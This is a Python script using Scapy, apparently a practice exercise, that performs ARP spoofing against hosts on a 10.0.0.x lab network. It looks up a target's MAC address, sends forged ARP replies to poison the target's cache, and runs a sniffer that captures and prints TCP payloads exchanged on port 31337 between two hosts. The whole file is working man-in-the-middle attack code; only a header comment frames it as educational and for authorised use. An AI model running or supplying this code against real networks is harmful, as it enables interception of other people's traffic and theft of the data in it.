from scapy.all import sniff, Ether, ARP, srp
from time import sleep
import threading

# DISCLAIMER:
# This script demonstrates how to craft and send ARP packets using Scapy.
# It includes functionality for ARP spoofing to hijack network traffic.
# The purpose of this script is to practice and understand network security concepts.
# It can be used to learn how ARP spoofing works and how to intercept traffic.
# This script is intended solely for educational purposes and should only be used
# in a controlled environment with explicit permission. Unauthorized use of this script
# on networks or systems you do not own or have permission to test is illegal and unethical.
# Always use your skills responsibly and ethically.
# Happy Hacking!

# Define a function to get the MAC address of the given IP.
def get_mac(dst_ip, operation, interface, src_mac):

    # Craft an ARP request packet.
    arp_request = ARP(pdst = dst_ip, op = operation)
    ether_frame = Ether(src = src_mac, dst = "FF:FF:FF:FF:FF:FF")
    arp_packet = ether_frame / arp_request

    # Send the packet and receive the response.
    responses, unanswered = srp(arp_packet, timeout = 2, retry = 1, verbose=False, iface = interface)
        
    if responses:
        return responses[0][1].hwsrc

    else:
        return None

# Define a function to spoof the MAC address of the given IP.
def arp_spoof(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface):

    # Craft an ARP response packet.
    arp_response = ARP(pdst = dst_ip, psrc = spoofed_ip, hwdst = dst_mac, hwsrc = src_mac, op = operation)
    ether_frame = Ether(src = src_mac, dst = dst_mac)
    arp_packet = ether_frame / arp_response

    try_counter = 0
    while try_counter <= 9:
        # Send the packet and receive the response.
        responses, unanswered = srp(arp_packet, timeout = 2, retry = 1, verbose=False, iface = interface)
                
        if responses:
            print(responses)
            return True

        else:
            print(f"No response received from IP {dst_ip}")
        
        try_counter = try_counter + 1
        sleep(3)
    
    return False

# Define a callback function to handle sniffed packets.
def packet_callback(packet):
    if packet.haslayer('IP'):
        ip_layer = packet['IP']
        
        if ip_layer.haslayer('TCP'):
            tcp_layer = packet['TCP']
            raw_layer = packet.getlayer('Raw')  # Extract the raw data (payload)

            src_ip = ip_layer.src
            dst_ip = ip_layer.dst
            src_port = tcp_layer.sport
            dst_port = tcp_layer.dport
            payload = raw_layer.load if raw_layer else b''

            # Check if the packet matches the specified criteria.
            if ((src_ip == '10.0.0.4' and dst_ip == '10.0.0.2') or 
                (src_ip == '10.0.0.2' and dst_ip == '10.0.0.4')) and \
               (src_port == 31337 or dst_port == 31337):
                print(f"Captured Packet:")
                print(f"Source IP: {src_ip}, Source Port: {src_port}")
                print(f"Destination IP: {dst_ip}, Destination Port: {dst_port}")
                print(f"Payload: {payload.decode(errors='ignore')}")

# Define a function to start sniffing.
def start_sniffing(interface):
    sniff(prn = packet_callback, iface = interface, filter = "", store = 0, timeout = 300)

# Define a driver logic.
def main(): 
    # Define required params.
    interface = "eth0"
    operation = 0x01
    src_ip = "10.0.0.3"
    dst_ip = "10.0.0.4"
    spoofed_ip = "10.0.0.2"
    src_mac = "82:14:fa:8f:a7:b2"
    
    # Start the sniffing thread.
    sniffing_thread = threading.Thread(target = start_sniffing, args = (interface,))
    sniffing_thread.start()

    print(f"Getting the mac address of {dst_ip} ...")
    dst_mac = get_mac(dst_ip, operation, interface, src_mac)

    if not dst_mac:
        print("Could not get the MAC address.")
        print(f"Aborting the operation.")
        exit(1)

    else:
        sleep(2)
        print(f"({dst_ip}, {dst_mac})")

        print(f"Spoofing started for {spoofed_ip} ...")
        operation = 0x02

        is_successful =  arp_spoof(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface)

        if is_successful:
            print(f"Successfuly spoofed the response.")
        
        else:
            print("Could not spoof.")
            print(f"Aborting the operation.")
            exit(1)

if __name__ == "__main__":
    main()
